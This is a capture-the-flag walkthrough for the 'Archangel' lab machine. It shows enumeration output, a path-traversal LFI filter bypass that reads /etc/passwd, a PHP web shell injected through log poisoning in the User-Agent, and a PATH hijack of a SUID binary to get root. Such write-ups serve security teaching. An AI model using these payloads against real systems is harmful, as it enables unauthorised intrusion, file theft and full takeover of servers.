# Archangel

## Enumeration

### NMAP

The first step to understanding what we are attacking is to determine what ports the target has open and see what service we can find.  

Command:

```bash
nmap -A -p- -oN nmap/all_port_aggressive $TARGET
```

Results:

```bash
Nmap scan report for 10.10.227.48
Host is up (0.082s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   18.25 ms 10.6.0.1
2   ... 3
4   82.34 ms 10.10.227.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.32 seconds
```

### Website (Manual)

Not everything about enumeration can be automated, so we should look at the site being hosted by the target and see if we can discover any more information. One thing that stands out almost immediately is the domain mentioned in the `Send us a mail:` prompt at the top of the page. We can add this to `/etc/hosts` to see if there is virtual hosting being done on the target. If there is, then adding this to the `/etc/hosts` file and navigating to `http://mafialive.thm` will bring us to a different site.

![WaveFireSite](../media/pictures/archangel_wavefire_site.png)

When we navigate to `mafialive.thm` we are greeted with a basic HTML page that tells us it is under development and gives us a flag.

![MafialiveMain](../media/pictures/archangel_underdev_main.png)

Now we can begin to enumerate this site for hidden directories.

Command:

```bash
gobuster dir -u http://mafialive.thm -w <wordlist> -t 50 -x php -o mafialive_main
```

Output:

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/12/16 20:05:53 Starting gobuster in directory enumeration mode
===============================================================
/test.php             (Status: 200) [Size: 286]
/server-status        (Status: 403) [Size: 278]
                                               
===============================================================
2022/12/16 20:06:52 Finished
===============================================================
```

## Local File Inclusion (LFI)

We have discovered a `test.php` page and nothing else. Taking a look at this page, there is a simple button on it that displays a phrase when we click it. Looking at the URL,  however, discloses a parameter `view` whose value is a filepath.

![MafialiveTest1](../media/pictures/archangel_underdev_test1.png)

Let's see if we can get the source for the `test.php` page by replacing `mrrobot.php` with `test.php`. A basic replace didn't work, so we can try using a PHP filter to convert it to base64 and smuggle it out. By replacing `/var/www/html/development_testing/mrrobot.php` with `php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php` we can get the base64 encoded source code returned to us. 

Source:

```php
<?php
//FLAG: <REDACTED FOR WRITEUP>
function containsStr($str, $substr) {
	return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
	if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
		include $_GET['view'];
	}else{
		echo 'Sorry, Thats not allowed';
	}
}
?>
```

The part we are intersted in is the `<?php ... ?>` piece where the hidden PHP code is written. This shows us a few interesting things we can use to our advantage: 1) `/var/www/html/development_testing` must be in the `view` parameter and 2) the path cannot contain `../..`. The simple filter imposed by the code is easy to get around by adding an additional `/` to `../..`, turning it into `..//..`. Next we can perform a path traversal to any location the user running the website has access to by walking up the directory tree starting at `/var/www/html/development_testing` using `..//..`. We can test this to make sure our theory is correct by targeting `?view=/var/www/html/development_testing/..//..//..//..//..//..//../etc/passwd`.

![MafialiveTestLFIConfirm](../media/pictures/archangel_underdev_test2.png)

When we attempt the LFI attack, we successfully get back the `/etc/passwd` file. This confirms our theory. 


## Remote Code Execution (RCE)

Reading file content is good, but executing arbitraty commands is better. How, then, can we achieve our objective? The answer: `Log Poisoning`. Since we can read local files, we can read the server's log file. We also know that this site is written in PHP, meaning we may be able to inject a command into the log and have the server execute it for us. Webserver logs generally log the IP address of the requesting machine, the path, response code, user-agent, and time. Out of these, we have control over the path and user-agent. We are using the path to read files, meaning the user-agent is what we will poison the log with. 

By injecting PHP into the `User-Agent` header, we can add a URL parameter to the site. This URL parameter is where we will add the command we want to run. Let's assume we want to add a new parameter `c` using log poisoning via the `User-Agent`.  To achieve this, we will replace the existing `User-Agent` with the following:

```php
<?php system($_GET['c']); ?>
```

When the server gets a request with the above payload as the `User-Agent`, it will evaluate it and execute the PHP code. After this parameter is injected, we can make a request to the server that looks like:

```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../../var/log/apache2/access.log&c=cat /etc/passwd
```

Now when you go back and check the log, the contents of `/etc/passwd` should be in the location of that request's `User-Agent`.

We only have to poison the log in one place, one time, and every time we enter that URL parameter, the poisoned location will be updated. 

*Note: To manipulate the header information (where the User-Agent is stored), you will need a tool like BurpSuite or to send the request using Python, PHP, Go, etc.*

## Privilege Escalation (Horizontal)

Once we have uploaded a reverse shell using log poisoning and gotten a foothold on the target machine, we can begin to escalate our privileges. First, we look in the `/home` directory to see what users there are and if we are allowed to access any of the home directories. In this case there is one user `Archangel` and we are allowed to view his home directory and discover a `user.txt` file containing a flag. 

Getting that flag was good, but we don't really have much leverage on this machine as the current user (`www-data`).  Running the find command for SUID binaries and the GETCAP command for capabilities does not turn up anything we can use to abuse the machine.  Looking in the crontab, however, shows us that `Archangel` is running a script every minute.

![crontab](../media/pictures/archangel_crontab.png)

When we take a look at the file referenced, we notice we have write permissions, meaning we can insert a reverse shell or our own script to gain a shell as `Archangel`.  All we have to do is overwrite the existing `/opt/helloworld.sh` file and wait for the cron job to run, then we will become `Archangel`. After we gain the shell we can navigate back to `/home/archangel` and look in `secret` to find `user2.txt` which contain's a flag. 

## Privilege Escalation (Root)

After grabbing the flag from `user2.txt` we can see there is a file called `backup` in the same directory, owned by root, with the SUID bit set. Running `file` on it shows it is an `ELF` binary. If we run `strings` on it we can find something interesting: it is executing a `cp` with a relative path to the binary.

![backupStrings](../media/pictures/archangel_backup_strings.png)

The use of this relative path allows us to point the binary to a `cp` binary created by us, allowing us to execute commands as root.  We can create a basic shell script like this:

```bash
echo "#!/bin/bash\n/bin/bash" > cp
chmod +x cp
```

Next we have to alter our `PATH` to lookin `/home/archangel/secret` for our malicious `cp` file. 

```bash
export PATH=/home/archangel/secret:$PATH
```

After that, we can run the `backup` binary and drop into a root shell.  Once we have a root shell, we can navigate to `/root` and read the flag from `root.txt`. 